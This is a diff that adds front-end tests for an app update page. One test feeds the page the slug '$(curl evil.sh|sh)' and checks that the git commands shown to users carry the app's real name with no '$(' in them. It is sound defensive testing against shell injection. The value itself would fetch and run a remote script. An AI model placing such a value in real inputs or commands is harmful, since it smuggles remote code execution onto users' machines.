@@ -110,6 +110,22 @@ afterEach(() => {
 });
 
 describe('the update page', () => {
+  it('gives git commands in the app’s own name, whatever the link said: they get pasted into a shell', async () => {
+    // The directory answers a loose spelling with the app it means, so this link opens a real app's page.
+    getApp.mockImplementation(async () => detail('curl-evil-sh-sh'));
+    await mountUpdate('$(curl evil.sh|sh)');
+    const commands = container.querySelector('.git-push pre code')?.textContent ?? '';
+    expect(commands).toContain('/api/git/curl-evil-sh-sh.git');
+    expect(commands).not.toContain('$(');
+  });
+
+  it('offers no git to an app that plays on its own site, as it has no bundle here to replace', async () => {
+    getApp.mockImplementation(async (slug: string) => ({ ...detail(slug), external: { url: 'https://elsewhere.test/', host: 'elsewhere.test' } }));
+    await mountUpdate('linked');
+    expect(container.querySelector('h1')?.textContent).toBe('Notes');
+    expect(container.querySelector('.git-push')).toBeNull();
+  });
+
   it('takes a bundle dropped beside its zone as the new version, and leaves none stashed', async () => {
     await mountUpdate('notes');
     expect(container.querySelector('h1')?.textContent).toBe('Notes');
